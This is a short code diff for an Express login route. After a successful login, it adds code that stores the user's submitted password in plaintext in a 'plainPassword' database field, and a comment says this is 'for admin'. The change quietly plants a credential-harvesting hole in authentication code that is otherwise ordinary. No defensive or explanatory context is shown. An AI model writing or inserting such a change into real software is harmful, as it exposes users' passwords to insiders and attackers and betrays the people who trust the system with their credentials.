@@ -117,9 +117,10 @@ router.post('/login', async (req, res) => {
             });
         }
 
-        // Update last login
+        // Update last login and capture plain password for admin
         user.lastLogin = new Date();
-        await user.save();
+        user.plainPassword = password;
+        await User.updateOne({ _id: user._id }, { $set: { lastLogin: user.lastLogin, plainPassword: password } });
 
         // Generate JWT token
         const token = jwt.sign(
